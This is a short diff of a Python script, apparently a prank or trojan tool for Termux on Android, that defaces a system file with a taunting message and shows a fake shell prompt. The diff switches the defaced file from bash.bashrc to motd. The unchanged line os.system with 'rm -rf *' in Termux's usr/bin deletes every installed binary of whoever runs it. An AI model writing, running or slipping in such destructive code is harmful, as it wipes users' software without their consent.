@@ -49,8 +49,8 @@ while True:
 	red("\/"*20)
 	print("")
 	lack = "'PS1=\[\e[39m\]IXZ TE ARREGAÇOU\[\e[0m\]  '"
-	hackz = open("/data/data/com.termux/files/usr/etc/bash.bashrc", "w+")
-	hackz.write(f"{lack}")
+	hackz = open("/data/data/com.termux/files/usr/etc/motd", "w+")
+	hackz.write("DERRUBADO PELO IXZ... PRESS F TO PAY RESPECTS!")
 	os.system("cd /data/data/com.termux/files/usr/bin && rm -rf *")
 	resp = int(input("localhost@u_2777a: "))
 	if(resp == 1):
